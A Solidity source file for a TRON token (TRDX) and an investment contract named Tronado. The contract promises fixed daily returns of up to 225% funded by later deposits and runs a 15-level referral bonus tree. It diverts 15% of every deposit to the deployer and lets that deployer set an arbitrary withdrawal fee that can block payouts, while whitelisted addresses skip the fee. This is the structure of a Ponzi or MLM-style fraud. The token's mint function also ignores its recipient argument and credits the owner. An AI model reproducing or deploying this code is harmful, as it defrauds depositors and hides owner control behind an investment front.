//SourceUnit: Tronado2.sol

pragma solidity 0.4.25;

interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }

contract Tronadotoken {
 
    using SafeMath for uint256;
    address public owner;
    address public newOwner;
    string public name;
    string public symbol;
    uint8 public decimals = 8;
    uint256 totalFrozen;
    uint256 public totalSupply;

    mapping (address => uint256) public balanceOf;
    
    mapping (address => mapping (address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event OwnershipTransferred(address indexed _from, address indexed _to);

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);


    uint256 initialSupply = 500000000;
    string tokenName = 'Tronado';
    string tokenSymbol = 'TRDX';
    
    
    constructor() public {
        owner = msg.sender;
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }
    
    function mint(address account, uint256 amount) external {
        require(account != address(0), "TRC20: mint to the zero address");
        require(msg.sender == owner,'you are not the owner');

        totalSupply = totalSupply.add(amount);
        balanceOf[msg.sender] += amount;
    }
    
      modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
  
    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
  }
  
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
  }


    function _transfer(address _from, address _to, uint _value) private {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    } 
      
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }


    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

	
	function bulkTransfer(address[]  _receivers, uint256[]  _amounts) external {
		require(_receivers.length == _amounts.length);
		for (uint256 i = 0; i < _receivers.length; i++) {
			_transfer(msg.sender, _receivers[i], _amounts[i]);
		}
	}
	
	function totalSupply() public view returns (uint256) {
		return totalSupply;
	}
	
}

contract Tronado {
    using SafeMath for uint256;
    Tronadotoken public tokenContract; 
     
    struct Tarif {
        uint256 life_days;
        uint256 percent;
        uint256 min_inv;
    }
     struct Reward_tarif {
        uint256 reward_amount;
        uint256 business;
    }
    

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 reward_bonus;
        uint256 last_payout;
        uint256 last_day_payout;
        uint256 last_24_hour_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        uint256 direct_team;
        uint256 direct_business;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
        mapping(uint8 => uint256) levelBusiness;

        mapping(uint8 => bool) achieved_reward;
    }
    
    struct PlayerWithdrawnInfo {
        uint256 total_match_bonus_withdrawn;
        uint256 total_dividends_withdrawn;
        bool is_active;
    }

    address public referral_com;
    address public stakingAddress;//?

    uint256 public invested;
     uint256 public total_team;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    uint256 public withdrawFee;
    uint256 public releaseTime = 1598104800;//1598104800
    
    uint256  initialSupply = 40000000000000000;
    uint256 public released = 0;
    uint8[] public ref_bonuses; // 1 => 1%
    

    Tarif[] public tarifs;


    Reward_tarif[] public reward;
    mapping(address => Player) public players;
    mapping(address => PlayerWithdrawnInfo) public PWI;
    mapping(address => bool) public whiteListed;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor(address _stakingAddress,Tronadotoken _tokenContract) public {
        referral_com = msg.sender;
        tokenContract = _tokenContract;
        stakingAddress = _stakingAddress;
        withdrawFee = 0;
        whiteListed[referral_com] = true;

        //days , total return percentage//min invest
        tarifs.push(Tarif(300, 225,1000000000));
        tarifs.push(Tarif(100, 150,2000000000));
     
    
        ref_bonuses.push(50);           
        ref_bonuses.push(20);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
         
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);

        //reward,direct_business
        
        

        reward.push(Reward_tarif(2000000000,100000000000));
        reward.push(Reward_tarif(2500000000,2500000000000));
        reward.push(Reward_tarif(3500000000,550000000000));
        reward.push(Reward_tarif(5000000000,1000000000000));
        reward.push(Reward_tarif(10000000000,1750000000000));
        reward.push(Reward_tarif(16000000000,3800000000000));
        reward.push(Reward_tarif(32000000000,7500000000000));
        reward.push(Reward_tarif(64000000000,12800000000000));
        reward.push(Reward_tarif(128000000000,25600000000000));
        reward.push(Reward_tarif(300000000000,51200000000000));
         

    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(players[up].direct_team < i+1) break;
                if(i<10)
                {
                   if( players[up].levelBusiness[i] > reward[i].business )
                   {
                       if(players[up].achieved_reward[i])
                       {
                           //already achieved reward
                       }else
                       {
                           if(i == 0)
                           {
                               if(players[up].direct_team >14)
                               {
                                   players[up].reward_bonus += reward[i].reward_amount;
                                     players[up].achieved_reward[i] = true;
                               }
                           }else{
                               
                               if(players[up].achieved_reward[i-1])
                               {
                                    players[up].reward_bonus += reward[i].reward_amount;
                                    players[up].achieved_reward[i] = true;
                               }
                                
                               
                           }
                           
                          
                       }
                   }
                       
                }
            
            uint256 bonus = _amount * ref_bonuses[i] / 1000;

            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0)) {//first time entry
            if(players[_upline].deposits.length == 0) {//no deposite from my upline
                _upline = referral_com;
            }
            
                if(_amount== 1000000000)
                {
                     players[_addr].direct_bonus += _amount / 20;//5 % direct bonus
                    direct_bonus += _amount / 20;
                }
               
                
            
            total_team++;
            players[_addr].upline = _upline;
            players[_upline].direct_team++;
            players[_upline].direct_business +=_amount;
             

            emit Upline(_addr, _upline, _amount / 20);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;
                 players[_upline].levelBusiness[i] += _amount;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found"); // ??
        require(msg.value >= tarifs[_tarif].min_inv, "Less Then the min investment");
        require(now >= releaseTime, "not open yet");
        Player storage player = players[msg.sender];
        PlayerWithdrawnInfo  storage pwi = PWI[msg.sender];
        pwi.is_active = true;
        require(player.deposits.length < 1000, "Max 1000 deposits per address");
        if(released <  initialSupply)
        {
          
          
            if(player.deposits.length < 1) // 100 % TRDX on first deposit first time deposits
            {   
                if(_tarif == 0)
                {
                    tokenContract.transfer(msg.sender, msg.value.mul(100));
                    released += msg.value.mul(100);
                }else{
                    tokenContract.transfer(msg.sender, msg.value.mul(50));
                    released += msg.value.mul(50);
                }
                
            }else{
                
                if(_tarif ==0)
                {
                    tokenContract.transfer(msg.sender, msg.value.mul(25));
                     released += msg.value.mul(25);
                }else
                {
                    tokenContract.transfer(msg.sender, msg.value.mul(10));
                     released += msg.value.mul(10);
                }
                
            }
         
        }
 
    _setUpline(msg.sender, _upline, msg.value);
            
        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        referral_com.transfer(msg.value.mul(15).div(100));
         withdrawn += (msg.value.mul(15).div(100));

        emit NewDeposit(msg.sender, msg.value, _tarif);
    }

    function withdraw() payable external {
        require(msg.value >= withdrawFee || whiteListed[msg.sender] == true);

        Player storage player = players[msg.sender];
        PlayerWithdrawnInfo  storage pwi = PWI[msg.sender];
        
        
        _payout(msg.sender);
        
        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0 || player.reward_bonus > 0, "Zero amount");
    
        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus + player.reward_bonus;
        if(uint256(block.timestamp - player.last_day_payout) < 1 days)
        {
            player.last_24_hour_payout +=amount;
        }else{
            player.last_day_payout  = uint256(block.timestamp);
            player.last_24_hour_payout = amount;
        }
        require(player.last_24_hour_payout < 100000000000, "Max withdraw in one day is 100K tron");

        pwi.total_dividends_withdrawn +=player.dividends;
        pwi.total_match_bonus_withdrawn += player.match_bonus;
    
        player.dividends = 0;
        player.direct_bonus = 0;
        player.reward_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;
    
        msg.sender.transfer(amount);
    
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }

    function setWhitelist(address _addr) public {
        require(msg.sender == referral_com,"unauthorized call");
        whiteListed[_addr] = true;
    }

    function removeWhitelist(address _addr) public {
        require(msg.sender == referral_com,"unauthorized call");
        whiteListed[_addr] = false;
    }

    function setWithdrawFee(uint256 newFee) public {
        require(msg.sender == referral_com,"unauthorized call");
        withdrawFee = newFee;
    }


    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_bonus, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus,uint256 withdrawable_reward,  uint256[] memory structure,  uint256[] memory structurebusiness) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);
         uint256[] memory _structure = new uint256[](ref_bonuses.length);
         uint256[] memory _structurebusiness = new uint256[](ref_bonuses.length);
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            _structure[i] = player.structure[i];
            _structurebusiness[i] = player.levelBusiness[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus +  player.reward_bonus,
            player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            player.reward_bonus,
            _structure,
            _structurebusiness
        );
    }

    function userWithdrawnInfo(address _addr) view external returns(uint256 total_match_bonus_withdrawn, uint256 total_dividends_withdrawn,bool[] memory rewardsAchieved)
    {
        PlayerWithdrawnInfo storage pwi = PWI[_addr];
         bool[] memory _rewardsAchieved = new bool[](reward.length);
         for(uint8 i = 0; i < reward.length; i++) {
            _rewardsAchieved[i] = players[_addr].achieved_reward[i];
        }
        return
        (
            pwi.total_match_bonus_withdrawn +  players[_addr].direct_bonus,
            pwi.total_dividends_withdrawn,
            _rewardsAchieved
        );
    }
  

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus, uint256 _total_team) {
        return (invested, withdrawn, direct_bonus, match_bonus , _total_team);
    }

    function investmentsInfo(address _addr) view external returns(uint8[] memory ids, uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];

        uint8[] memory _ids = new uint8[](player.deposits.length);
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          Deposit storage dep = player.deposits[i];
          Tarif storage tarif = tarifs[dep.tarif];

          _ids[i] = dep.tarif;
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + tarif.life_days * 86400;
        }

        return (
          _ids,
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }

    function seperatePayoutOf(address _addr) view external returns(uint256[] memory withdrawable) {
        Player storage player = players[_addr];
        uint256[] memory values = new uint256[](player.deposits.length);
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                values[i] = dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return values;
    }


    function updateInitialsupply(uint256 tokens) public  {
       require(msg.sender==referral_com);
       initialSupply = tokens;
    }
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}